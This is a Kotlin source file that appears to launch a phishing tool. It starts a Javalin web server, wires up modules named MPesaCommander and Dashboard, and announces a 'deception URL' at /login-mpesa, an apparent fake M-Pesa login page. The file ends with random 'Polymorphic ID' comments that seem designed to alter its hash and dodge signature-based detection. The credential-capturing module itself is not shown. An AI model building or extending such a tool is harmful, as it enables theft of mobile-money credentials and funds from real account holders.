package com.fardc.sigint.core
import io.javalin.Javalin

fun main() {
    println("--- [🛡️] NOYAU SOUVERAIN v5.2 INITIALISÉ ---")
    val app = Javalin.create().start(8080)
    
    // Armado de Módulos
    MPesaCommander().setup(app)
    Dashboard().setup(app)
    
    app.get("/") { ctx -> 
        ctx.result("SOVEREIGN-CORE SIGINT : Actif.") 
    }
    
    println("[✅] URL de Engaño Lista: http://localhost:8080/login-mpesa")
}
// Polymorphic ID: QTQAopqYKtnxOLth
// Polymorphic ID: CgH7xTWaAjfOLvbW
// Polymorphic ID: UOkSkOxuShld2Djo
// Polymorphic ID: a4hZxqnBj09hP787
// Polymorphic ID: 8hmZP1SJctd1glvp
// Polymorphic ID: xelxRb38z8XAymkd
// Polymorphic ID: vvtRhUElgALiTF5L
// Polymorphic ID: a5JLOJVbkpIQQ2c6
// Polymorphic ID: CoyDCRA8wEIT7JHG
